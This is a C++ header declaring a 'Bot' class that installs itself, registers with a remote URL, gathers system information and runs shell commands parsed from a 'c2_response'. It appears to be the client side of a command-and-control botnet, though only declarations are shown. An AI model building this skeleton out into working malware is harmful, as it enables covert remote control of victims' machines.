#ifndef BOT_HH
#define BOT_HH

#include <iostream>
#include <memory>
#include <string>

#include <experimental/filesystem>
#include "installer.hh"
#include "rapidjson/document.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/writer.h"
#include "request.hh"
#include "sysinfo.hh"
#include "util.hh"

namespace fs = std::experimental::filesystem;

class Bot {
   public:
    Bot(const fs::path& install_dir);
    bool IsNew();
    void Install();
    void RegisterBot(const std::string& register_url);
    void ExecuteCommand(const std::string& command_url);

   private:
    bool is_new_;
    std::unique_ptr<Installer> install_;
    std::unique_ptr<sysinfo::DataList> sysinfo_;
};

class Command {
   public:
    Command(std::string& c2_response);
    std::string Execute();

    std::string command_text;
    std::string shell;
};

#endif  // BOT_HH